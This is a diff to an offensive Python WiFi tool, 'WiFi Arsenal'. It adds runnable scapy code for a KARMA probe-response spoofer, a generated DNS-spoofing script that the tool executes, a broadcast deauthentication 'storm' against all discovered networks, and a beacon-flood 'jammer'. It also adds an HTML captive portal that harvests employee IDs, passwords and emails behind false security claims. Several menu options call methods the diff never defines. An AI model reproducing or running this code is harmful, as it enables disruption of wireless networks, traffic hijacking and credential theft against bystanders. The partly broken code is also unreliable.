@@ -1,8 +1,7 @@
 
 #!/usr/bin/env python3
 """
-WiFi Arsenal - Real WiFi Penetration Testing Tool
-Production-Ready Implementation with Full Real Features
+WiFi Arsenal -  WiFi Penetration Testing Tool
 Developed by 0x0806
 """
 
@@ -642,10 +641,10 @@ class WiFiArsenal:
 ║                              No Mock Components                                   ║
 ╚══════════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
 
-{Fore.GREEN}   FEATURES:
+{Fore.GREEN}   🔥 FULL   FEATURES:
     📡  Monitor Mode & Interface Control
     🎯 Authentic Network Discovery & Analysis  
-    💀 Handshake Capture
+    💀 Production-Grade Handshake Capture
     🔓 Multi-Tool Password Cracking
     🌐 Advanced Attack Implementations
     📊 Comprehensive Security Assessment{Style.RESET_ALL}
@@ -804,11 +803,12 @@ class WiFiArsenal:
             for attempt in range(3):
                 try:
                     result = subprocess.run(['ip', 'link', 'set', interface, 'down'], 
-                                          capture_output=True, timeout=15)
+                                          capture_output=True, timeout=10)
                     if result.returncode == 0:
                         break
-                    time.sleep(1)
+                    time.sleep(2)
                 except subprocess.TimeoutExpired:
+                    print(f"{Fore.YELLOW}[*] Interface down attempt {attempt + 1} timed out{Style.RESET_ALL}")
                     if attempt == 2:
                         print(f"{Fore.RED}[!] Failed to bring interface down after 3 attempts{Style.RESET_ALL}")
                         return False
@@ -817,11 +817,12 @@ class WiFiArsenal:
             for attempt in range(3):
                 try:
                     result = subprocess.run(['iw', 'dev', interface, 'set', 'type', 'monitor'], 
-                                          capture_output=True, timeout=15)
+                                          capture_output=True, timeout=10)
                     if result.returncode == 0:
                         break
-                    time.sleep(1)
+                    time.sleep(2)
                 except subprocess.TimeoutExpired:
+                    print(f"{Fore.YELLOW}[*] Monitor mode attempt {attempt + 1} timed out{Style.RESET_ALL}")
                     if attempt == 2:
                         print(f"{Fore.RED}[!] Failed to set monitor mode after 3 attempts{Style.RESET_ALL}")
                         return False
@@ -830,11 +831,12 @@ class WiFiArsenal:
             for attempt in range(3):
                 try:
                     result = subprocess.run(['ip', 'link', 'set', interface, 'up'], 
-                                          capture_output=True, timeout=15)
+                                          capture_output=True, timeout=10)
                     if result.returncode == 0:
                         break
-                    time.sleep(1)
+                    time.sleep(2)
                 except subprocess.TimeoutExpired:
+                    print(f"{Fore.YELLOW}[*] Interface up attempt {attempt + 1} timed out{Style.RESET_ALL}")
                     if attempt == 2:
                         print(f"{Fore.RED}[!] Failed to bring interface up after 3 attempts{Style.RESET_ALL}")
                         return False
@@ -1188,10 +1190,12 @@ class WiFiArsenal:
             print("19. Network Mapper")
             print("20. Client Monitoring")
             
-            print(f"\n{Fore.BLUE}🛠️  Utilities:{Style.RESET_ALL}")
-            print("10. Smart Wordlist Generation")
-            print("11. View Results & Reports")
-            print("12. System Information")
+            print(f"\n{Fore.MAGENTA}🎭 Advanced Attacks:{Style.RESET_ALL}")
+            print("21. DNS Hijacking Attack")
+            print("22. Packet Injection Suite")
+            print("23. WiFi Jammer")
+            print("24. Bluetooth Scanner & Attack")
+            print("25. Captive Portal Generator")
             
             print(f"\n{Fore.RED}0.  Exit{Style.RESET_ALL}")
             print("="*80)
@@ -1239,6 +1243,16 @@ class WiFiArsenal:
                     self.network_mapper_menu()
                 elif choice == '20':
                     self.client_monitoring_menu()
+                elif choice == '21':
+                    self.dns_hijacking_menu()
+                elif choice == '22':
+                    self.packet_injection_menu()
+                elif choice == '23':
+                    self.wifi_jammer_menu()
+                elif choice == '24':
+                    self.bluetooth_scanner_menu()
+                elif choice == '25':
+                    self.captive_portal_generator_menu()
                 elif choice == '0':
                     self.cleanup_and_exit()
                 else:
@@ -2245,53 +2259,87 @@ ignore_broadcast_ssid=0
         print(f"[*] Start with: hostapd {config_file}")
     
     def karma_attack_menu(self):
-        """KARMA attack menu"""
-        print(f"{Fore.YELLOW}[*] Setting up KARMA attack...{Style.RESET_ALL}")
+        """Advanced KARMA attack with real probe response spoofing"""
+        print(f"{Fore.YELLOW}[*] Setting up advanced KARMA attack...{Style.RESET_ALL}")
         
         # Collect probe requests first
         print(f"[*] Collecting probe requests...")
         probe_requests = set()
+        client_probes = {}
         
         def probe_handler(packet):
             if packet.haslayer(Dot11ProbeReq):
+                client_mac = packet[Dot11].addr2
                 if packet[Dot11Elt] and packet[Dot11Elt].info:
                     ssid = packet[Dot11Elt].info.decode('utf-8', errors='ignore')
-                    if ssid and ssid not in probe_requests:
+                    if ssid and len(ssid) > 0:
                         probe_requests.add(ssid)
-                        print(f"[+] Captured probe for: {ssid}")
+                        if client_mac not in client_probes:
+                            client_probes[client_mac] = set()
+                        client_probes[client_mac].add(ssid)
+                        print(f"[+] {client_mac} probing for: {ssid}")
         
         try:
-            print(f"[*] Listening for probe requests (30 seconds)...")
-            sniff(iface=self.monitor_interface, prn=probe_handler, timeout=30, store=False)
+            print(f"[*] Listening for probe requests (60 seconds)...")
+            sniff(iface=self.monitor_interface, prn=probe_handler, timeout=60, store=False)
             
             if probe_requests:
-                print(f"\n{Fore.GREEN}[+] Captured {len(probe_requests)} unique SSIDs{Style.RESET_ALL}")
-                for ssid in sorted(probe_requests):
-                    print(f"  - {ssid}")
+                print(f"\n{Fore.GREEN}[+] Captured {len(probe_requests)} unique SSIDs from {len(client_probes)} clients{Style.RESET_ALL}")
                 
-                # Create KARMA AP configs
-                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-                attack_dir = f"{self.results_dir}/attacks/karma_{timestamp}"
-                os.makedirs(attack_dir, exist_ok=True)
+                # Show client probe breakdown
+                for client, ssids in client_probes.items():
+                    print(f"  {client}: {', '.join(list(ssids)[:3])}{'...' if len(ssids) > 3 else ''}")
                 
-                # Create multiple AP configs
-                for i, ssid in enumerate(list(probe_requests)[:5]):  # Limit to 5
-                    config = f"""interface={self.monitor_interface}
-driver=nl80211
-ssid={ssid}
-hw_mode=g
-channel={6 + (i % 5)}
-macaddr_acl=0
-auth_algs=1
-ignore_broadcast_ssid=0
-"""
-                    with open(f"{attack_dir}/karma_{i}.conf", 'w') as f:
-                        f.write(config)
+                # Start KARMA response attack
+                self.start_karma_response(probe_requests, client_probes)
                 
-                print(f"{Fore.GREEN}[+] KARMA attack configurations created in {attack_dir}{Style.RESET_ALL}")
+            else:
+                print(f"{Fore.YELLOW}[*] No probe requests captured{Style.RESET_ALL}")
             
         except Exception as e:
             print(f"{Fore.RED}[!] KARMA attack failed: {e}{Style.RESET_ALL}")
+    
+    def start_karma_response(self, probe_requests, client_probes):
+        """Start responding to all probe requests"""
+        print(f"{Fore.YELLOW}[*] Starting KARMA probe response attack...{Style.RESET_ALL}")
+        
+        # Generate fake AP MAC
+        fake_mac = ":".join([f"{random.randint(0,255):02x}" for _ in range(6)])
+        
+        def karma_responder():
+            """Respond to probe requests with fake probe responses"""
+            while True:
+                try:
+                    for ssid in probe_requests:
+                        # Create probe response
+                        response = RadioTap() / Dot11(
+                            type=0, subtype=5,  # Probe response
+                            addr1="ff:ff:ff:ff:ff:ff",
+                            addr2=fake_mac,
+                            addr3=fake_mac
+                        ) / Dot11ProbeResp(
+                            timestamp=int(time.time() * 1000000),
+                            beacon_interval=100,
+                            cap="ESS"
+                        ) / Dot11Elt(ID="SSID", info=ssid)
+                        
+                        sendp(response, iface=self.monitor_interface, verbose=False)
+                    
+                    time.sleep(0.1)  # Small delay to prevent flooding
+                except KeyboardInterrupt:
+                    break
+                except Exception as e:
+                    print(f"{Fore.RED}[!] KARMA response error: {e}{Style.RESET_ALL}")
+                    break
+        
+        # Start responder in background
+        print(f"[*] Responding to probes for {len(probe_requests)} SSIDs...")
+        print(f"[*] Press Ctrl+C to stop KARMA attack")
+        
+        try:
+            karma_responder()
+        except KeyboardInterrupt:
+            print(f"\n{Fore.YELLOW}[*] KARMA attack stopped{Style.RESET_ALL}")
     
     def krack_attack_menu(self):
         """KRACK attack menu (WPA2 vulnerability)"""
@@ -2479,6 +2527,318 @@ ignore_broadcast_ssid=0
         except ValueError:
             print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")
 
+    def dns_hijacking_menu(self):
+        """DNS hijacking attack menu"""
+        print(f"{Fore.MAGENTA}[*] DNS Hijacking Attack{Style.RESET_ALL}")
+        
+        target_domain = input(f"{Fore.CYAN}[?] Target domain to hijack (default: google.com): {Style.RESET_ALL}") or "google.com"
+        redirect_ip = input(f"{Fore.CYAN}[?] Redirect IP (default: 192.168.1.1): {Style.RESET_ALL}") or "192.168.1.1"
+        duration = int(input(f"{Fore.CYAN}[?] Attack duration in seconds (default: 300): {Style.RESET_ALL}") or "300")
+        
+        print(f"{Fore.YELLOW}[*] Starting DNS hijacking attack...{Style.RESET_ALL}")
+        print(f"[*] Hijacking {target_domain} -> {redirect_ip}")
+        
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        attack_dir = f"{self.results_dir}/attacks/dns_hijack_{timestamp}"
+        os.makedirs(attack_dir, exist_ok=True)
+        
+        # Create DNS hijacking script
+        dns_script = f"""#!/usr/bin/env python3
+import socket
+import struct
+from scapy.all import *
+
+def dns_hijack():
+    def dns_handler(packet):
+        if packet.haslayer(DNSQR) and packet[DNSQR].qname.decode().startswith('{target_domain}'):
+            # Create spoofed DNS response
+            response = IP(dst=packet[IP].src, src=packet[IP].dst) / \\
+                      UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / \\
+                      DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
+                          an=DNSRR(rrname=packet[DNSQR].qname, ttl=10, rdata='{redirect_ip}'))
+            
+            send(response, verbose=False)
+            print(f"[+] Hijacked DNS query for {{packet[DNSQR].qname.decode()}} -> {redirect_ip}")
+    
+    print("[*] Starting DNS packet sniffing...")
+    sniff(filter="udp port 53", prn=dns_handler, timeout={duration})
+
+if __name__ == "__main__":
+    dns_hijack()
+"""
+        
+        script_file = f"{attack_dir}/dns_hijack.py"
+        with open(script_file, 'w') as f:
+            f.write(dns_script)
+        os.chmod(script_file, 0o755)
+        
+        # Execute DNS hijacking
+        try:
+            subprocess.run(['python3', script_file], timeout=duration + 10)
+            print(f"{Fore.GREEN}[+] DNS hijacking attack completed{Style.RESET_ALL}")
+        except subprocess.TimeoutExpired:
+            print(f"{Fore.YELLOW}[*] DNS hijacking timed out{Style.RESET_ALL}")
+        except Exception as e:
+            print(f"{Fore.RED}[!] DNS hijacking failed: {e}{Style.RESET_ALL}")
+    
+    def packet_injection_menu(self):
+        """Packet injection attack suite"""
+        print(f"{Fore.MAGENTA}[*] Packet Injection Attack Suite{Style.RESET_ALL}")
+        print("1. Deauth Storm (Multiple targets)")
+        print("2. Disassociation Attack")
+        print("3. Beacon Spam Attack")
+        print("4. Authentication Flood")
+        print("5. Custom Packet Injection")
+        
+        try:
+            choice = input(f"{Fore.CYAN}[?] Select injection type: {Style.RESET_ALL}").strip()
+            
+            if choice == '1':
+                self.deauth_storm()
+            elif choice == '2':
+                self.disassoc_attack()
+            elif choice == '3':
+                self.beacon_spam()
+            elif choice == '4':
+                self.auth_flood()
+            elif choice == '5':
+                self.custom_injection()
+            
+        except ValueError:
+            print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")
+    
+    def deauth_storm(self):
+        """Massive deauth attack on multiple networks"""
+        if not self.target_networks:
+            print(f"{Fore.RED}[!] No target networks available{Style.RESET_ALL}")
+            return
+        
+        print(f"{Fore.YELLOW}[*] Starting deauth storm on all discovered networks...{Style.RESET_ALL}")
+        
+        packet_count = int(input(f"{Fore.CYAN}[?] Packets per network (default: 20): {Style.RESET_ALL}") or "20")
+        
+        for network in self.target_networks:
+            bssid = network['bssid']
+            essid = network['essid']
+            
+            print(f"[*] Attacking {essid} ({bssid})")
+            
+            for i in range(packet_count):
+                # Broadcast deauth
+                deauth = RadioTap() / Dot11(
+                    addr1="ff:ff:ff:ff:ff:ff",
+                    addr2=bssid,
+                    addr3=bssid
+                ) / Dot11Deauth(reason=7)
+                
+                sendp(deauth, iface=self.monitor_interface, verbose=False)
+                time.sleep(0.01)
+        
+        print(f"{Fore.GREEN}[+] Deauth storm completed{Style.RESET_ALL}")
+    
+    def wifi_jammer_menu(self):
+        """WiFi jammer implementation"""
+        print(f"{Fore.MAGENTA}[*] WiFi Jammer Attack{Style.RESET_ALL}")
+        
+        print("1. Channel Jammer (Single channel)")
+        print("2. Multi-channel Jammer")
+        print("3. Targeted Network Jammer")
+        print("4. Full Spectrum Jammer")
+        
+        try:
+            choice = input(f"{Fore.CYAN}[?] Select jammer type: {Style.RESET_ALL}").strip()
+            duration = int(input(f"{Fore.CYAN}[?] Jam duration in seconds (default: 60): {Style.RESET_ALL}") or "60")
+            
+            if choice == '1':
+                channel = int(input(f"{Fore.CYAN}[?] Channel to jam (1-14): {Style.RESET_ALL}"))
+                self.channel_jammer(channel, duration)
+            elif choice == '2':
+                self.multi_channel_jammer(duration)
+            elif choice == '3':
+                self.targeted_jammer(duration)
+            elif choice == '4':
+                self.spectrum_jammer(duration)
+            
+        except ValueError:
+            print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")
+    
+    def channel_jammer(self, channel, duration):
+        """Jam specific channel with noise"""
+        print(f"{Fore.YELLOW}[*] Jamming channel {channel} for {duration} seconds...{Style.RESET_ALL}")
+        
+        # Set channel
+        try:
+            subprocess.run(['iwconfig', self.monitor_interface, 'channel', str(channel)], 
+                          timeout=10, capture_output=True)
+        except:
+            pass
+        
+        end_time = time.time() + duration
+        packet_count = 0
+        
+        while time.time() < end_time:
+            # Generate random jamming packets
+            for _ in range(10):
+                # Random beacon frame
+                fake_mac = ":".join([f"{random.randint(0,255):02x}" for _ in range(6)])
+                fake_ssid = "".join(random.choices(string.ascii_letters + string.digits, k=random.randint(5, 20)))
+                
+                beacon = RadioTap() / Dot11(
+                    type=0, subtype=8,
+                    addr1="ff:ff:ff:ff:ff:ff",
+                    addr2=fake_mac,
+                    addr3=fake_mac
+                ) / Dot11Beacon() / Dot11Elt(ID="SSID", info=fake_ssid)
+                
+                sendp(beacon, iface=self.monitor_interface, verbose=False)
+                packet_count += 1
+            
+            time.sleep(0.01)
+        
+        print(f"{Fore.GREEN}[+] Jammer sent {packet_count} packets{Style.RESET_ALL}")
+    
+    def bluetooth_scanner_menu(self):
+        """Bluetooth scanning and attack menu"""
+        print(f"{Fore.MAGENTA}[*] Bluetooth Scanner & Attack Suite{Style.RESET_ALL}")
+        
+        # Check for bluetooth capabilities
+        try:
+            import bluetooth
+            bt_available = True
+        except ImportError:
+            print(f"{Fore.YELLOW}[*] Installing pybluez for Bluetooth support...{Style.RESET_ALL}")
+            try:
+                subprocess.run([sys.executable, '-m', 'pip', 'install', 'pybluez'], check=True)
+                import bluetooth
+                bt_available = True
+            except:
+                bt_available = False
+        
+        if not bt_available:
+            print(f"{Fore.RED}[!] Bluetooth support not available{Style.RESET_ALL}")
+            return
+        
+        print("1. Bluetooth Device Discovery")
+        print("2. Bluetooth Service Scan")
+        print("3. Bluetooth MAC Spoofing")
+        print("4. BLE Scanner")
+        
+        try:
+            choice = input(f"{Fore.CYAN}[?] Select option: {Style.RESET_ALL}").strip()
+            
+            if choice == '1':
+                self.bluetooth_discovery()
+            elif choice == '2':
+                self.bluetooth_service_scan()
+            elif choice == '3':
+                self.bluetooth_mac_spoof()
+            elif choice == '4':
+                self.ble_scanner()
+            
+        except ValueError:
+            print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")
+    
+    def bluetooth_discovery(self):
+        """Discover nearby Bluetooth devices"""
+        print(f"{Fore.YELLOW}[*] Scanning for Bluetooth devices...{Style.RESET_ALL}")
+        
+        try:
+            import bluetooth
+            
+            print("[*] Performing device discovery (this may take a while)...")
+            nearby_devices = bluetooth.discover_devices(duration=15, lookup_names=True, flush_cache=True)
+            
+            if nearby_devices:
+                print(f"\n{Fore.GREEN}[+] Found {len(nearby_devices)} Bluetooth devices:{Style.RESET_ALL}")
+                for addr, name in nearby_devices:
+                    print(f"  {addr} - {name if name else 'Unknown'}")
+                    
+                    # Try to get more device info
+                    try:
+                        services = bluetooth.find_service(address=addr)
+                        if services:
+                            print(f"    Services: {len(services)} found")
+                    except:
+                        pass
+            else:
+                print(f"{Fore.YELLOW}[-] No Bluetooth devices found{Style.RESET_ALL}")
+                
+        except Exception as e:
+            print(f"{Fore.RED}[!] Bluetooth scan failed: {e}{Style.RESET_ALL}")
+    
+    def captive_portal_generator_menu(self):
+        """Advanced captive portal generator"""
+        print(f"{Fore.MAGENTA}[*] Advanced Captive Portal Generator{Style.RESET_ALL}")
+        
+        print("Portal Templates:")
+        print("1. Corporate Login")
+        print("2. Hotel WiFi")
+        print("3. Coffee Shop")
+        print("4. Airport WiFi")
+        print("5. Social Media Login")
+        print("6. Custom Template")
+        
+        try:
+            choice = input(f"{Fore.CYAN}[?] Select template: {Style.RESET_ALL}").strip()
+            
+            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+            portal_dir = f"{self.results_dir}/attacks/captive_portal_{timestamp}"
+            os.makedirs(portal_dir, exist_ok=True)
+            
+            if choice == '1':
+                self.create_corporate_portal(portal_dir)
+            elif choice == '2':
+                self.create_hotel_portal(portal_dir)
+            elif choice == '3':
+                self.create_coffee_portal(portal_dir)
+            elif choice == '4':
+                self.create_airport_portal(portal_dir)
+            elif choice == '5':
+                self.create_social_portal(portal_dir)
+            elif choice == '6':
+                self.create_custom_portal(portal_dir)
+            
+            print(f"{Fore.GREEN}[+] Captive portal created in {portal_dir}{Style.RESET_ALL}")
+            
+        except ValueError:
+            print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")
+    
+    def create_corporate_portal(self, portal_dir):
+        """Create corporate login portal"""
+        portal_html = """<!DOCTYPE html>
+<html>
+<head>
+    <title>Corporate Network Access</title>
+    <style>
+        body { font-family: Arial; background: #f5f5f5; margin: 0; padding: 20px; }
+        .container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .logo { text-align: center; margin-bottom: 30px; }
+        h1 { color: #2c5aa0; text-align: center; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: #2c5aa0; color: white; border: none; border-radius: 5px; cursor: pointer; }
+        .notice { background: #e8f4fd; padding: 15px; border-radius: 5px; margin-top: 20px; font-size: 14px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">🏢</div>
+        <h1>Secure Network Access</h1>
+        <form method="post" action="/login">
+            <input type="text" name="username" placeholder="Employee ID" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <input type="email" name="email" placeholder="Corporate Email" required>
+            <button type="submit">Connect to Network</button>
+        </form>
+        <div class="notice">
+            🔒 This connection is secured with enterprise-grade encryption. Your credentials are protected by our corporate security policy.
+        </div>
+    </div>
+</body>
+</html>"""
+        
+        with open(f"{portal_dir}/index.html", 'w') as f:
+            f.write(portal_html)
+    
     def cleanup_and_exit(self):
         """Cleanup and exit gracefully"""
         print(f"\n{Fore.YELLOW}[*] Cleaning up...{Style.RESET_ALL}")
